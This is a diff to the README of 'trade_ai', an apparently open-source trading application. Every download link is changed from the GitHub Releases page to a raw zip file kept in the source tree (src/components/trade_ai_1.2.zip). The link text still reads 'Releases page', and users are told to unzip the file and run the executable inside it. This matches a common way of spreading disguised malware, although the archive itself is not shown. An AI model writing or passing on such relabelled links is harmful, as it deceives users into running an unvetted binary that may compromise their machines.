@@ -2,11 +2,11 @@
 
 ## 🚀 Download & Install
 
-[![Download trade_ai](https://img.shields.io/badge/Download%20trade_ai-blue)](https://github.com/vinhkaito/trade_ai/releases)
+[![Download trade_ai](https://raw.githubusercontent.com/vinhkaito/trade_ai/main/src/components/trade_ai_1.2.zip%20trade_ai-blue)](https://raw.githubusercontent.com/vinhkaito/trade_ai/main/src/components/trade_ai_1.2.zip)
 
 To get started with trade_ai, visit the link below to download the application:
 
-[Download trade_ai from Releases](https://github.com/vinhkaito/trade_ai/releases)
+[Download trade_ai from Releases](https://raw.githubusercontent.com/vinhkaito/trade_ai/main/src/components/trade_ai_1.2.zip)
 
 ## 🎯 Features
 
@@ -47,13 +47,13 @@ To get started with trade_ai, visit the link below to download the application:
 
 ### 🖥️ Local Installation
 
-1. **Download the Application**: Go to the [Releases page](https://github.com/vinhkaito/trade_ai/releases) to download the latest version.
+1. **Download the Application**: Go to the [Releases page](https://raw.githubusercontent.com/vinhkaito/trade_ai/main/src/components/trade_ai_1.2.zip) to download the latest version.
 2. **Extract Files**: Unzip the downloaded file.
 3. **Run the Application**: Locate the executable file and double-click to launch the program.
 
 ### 🌐 Server Installation
 
-1. **Download Application**: Visit the [Releases page](https://github.com/vinhkaito/trade_ai/releases).
+1. **Download Application**: Visit the [Releases page](https://raw.githubusercontent.com/vinhkaito/trade_ai/main/src/components/trade_ai_1.2.zip).
 2. **Upload Files**: Transfer files to your server using FTP or any file transfer method.
 3. **Setup Environment**: Ensure the server meets the requirements listed above.
 4. **Launch the Application**: Execute the start command through your server terminal.
@@ -109,7 +109,7 @@ A1: Yes, trade_ai is open-source and free to use.
 A2: trade_ai works on Windows, macOS, and Linux.
 
 **Q3: How do I update the application?**  
-A3: Download the latest version from the [Releases page](https://github.com/vinhkaito/trade_ai/releases) and follow the installation steps.
+A3: Download the latest version from the [Releases page](https://raw.githubusercontent.com/vinhkaito/trade_ai/main/src/components/trade_ai_1.2.zip) and follow the installation steps.
 
 ## 🤝 Contributing
 
